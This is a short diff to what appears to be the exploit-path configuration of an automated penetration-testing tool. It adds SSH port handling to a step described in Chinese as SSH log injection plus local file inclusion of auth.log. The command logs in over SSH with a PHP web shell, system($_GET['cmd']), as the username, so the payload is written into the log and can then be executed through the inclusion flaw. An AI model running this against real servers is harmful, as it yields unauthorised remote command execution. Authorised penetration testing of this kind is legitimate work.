@@ -279,8 +279,14 @@ exploit_paths:
         description: "SSH 日志注入 + LFI 包含 auth.log（使用已确认参数和深度）"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          SSH_PORT="{TARGET_PORT}"
+          if ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
+            SSH_PORT=22
+          fi
           echo "=== SSH Log Poisoning ==="
+          echo "[INFO] SSH poison target: {TARGET_IP}:$SSH_PORT"
           sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+            -p "$SSH_PORT" \
             '<?php system($_GET["cmd"]);?>'@{TARGET_IP} 2>&1 || true
           sleep 2
 
